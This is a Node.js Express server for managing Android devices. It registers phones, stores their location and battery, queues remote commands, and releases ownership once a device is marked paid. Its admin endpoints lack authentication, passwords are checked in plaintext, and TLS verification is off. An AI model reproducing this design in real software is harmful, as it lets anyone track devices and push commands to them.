const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// PostgreSQL connection using Render's environment variable
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false // Required for Render PostgreSQL
    }
});

// Test database connection
pool.connect((err, client, release) => {
    if (err) {
        console.error('Database connection failed:', err.message);
    } else {
        console.log('Connected to PostgreSQL successfully');
        release();
    }
});

// ============= API ENDPOINTS =============

// Register device
app.post('/api/register', async (req, res) => {
    const { deviceId, name, model, androidVersion } = req.body;
    
    try {
        await pool.query(
            `INSERT INTO devices (id, name, model, android_version, last_seen) 
             VALUES ($1, $2, $3, $4, NOW())
             ON CONFLICT (id) DO UPDATE SET 
             name = EXCLUDED.name, 
             model = EXCLUDED.model, 
             android_version = EXCLUDED.android_version,
             last_seen = NOW()`,
            [deviceId, name, model, androidVersion]
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Register error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Report device status
app.post('/api/status', async (req, res) => {
    const { deviceId, battery, location } = req.body;
    
    try {
        await pool.query(
            `UPDATE devices SET battery = $1, location = $2, last_seen = NOW() WHERE id = $3`,
            [battery, location, deviceId]
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Status error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Get pending commands for device
app.get('/api/commands/:deviceId', async (req, res) => {
    const { deviceId } = req.params;
    
    try {
        const result = await pool.query(
            `SELECT id, command FROM commands WHERE device_id = $1 AND status = 'pending' ORDER BY created_at ASC`,
            [deviceId]
        );
        
        // Mark commands as sent
        for (const cmd of result.rows) {
            await pool.query(`UPDATE commands SET status = 'sent' WHERE id = $1`, [cmd.id]);
        }
        
        res.json({ commands: result.rows });
    } catch (err) {
        console.error('Commands error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Send command from admin panel
app.post('/api/send-command', async (req, res) => {
    const { deviceId, command } = req.body;
    
    try {
        await pool.query(
            `INSERT INTO commands (device_id, command) VALUES ($1, $2)`,
            [deviceId, command]
        );
        res.json({ success: true });
    } catch (err) {
        console.error('Send command error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Mark device as paid
app.post('/api/mark-paid', async (req, res) => {
    const { deviceId } = req.body;
    
    try {
        await pool.query(`UPDATE devices SET paid = TRUE WHERE id = $1`, [deviceId]);
        await pool.query(`INSERT INTO commands (device_id, command) VALUES ($1, 'release_ownership')`, [deviceId]);
        res.json({ success: true });
    } catch (err) {
        console.error('Mark paid error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Get all devices
app.get('/api/devices', async (req, res) => {
    try {
        const result = await pool.query(`SELECT * FROM devices ORDER BY last_seen DESC`);
        res.json({ devices: result.rows });
    } catch (err) {
        console.error('Get devices error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Admin login
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    
    try {
        const result = await pool.query(
            `SELECT * FROM admin_users WHERE username = $1 AND password = $2`,
            [username, password]
        );
        
        if (result.rows.length === 0) {
            res.status(401).json({ error: 'Invalid credentials' });
        } else {
            res.json({ success: true });
        }
    } catch (err) {
        console.error('Login error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Root endpoint
app.get('/', (req, res) => {
    res.send('MDM Server is running. Go to /admin.html for admin panel.');
});

// Start server
app.listen(PORT, () => {
    console.log(`MDM Server running on port ${PORT}`);
});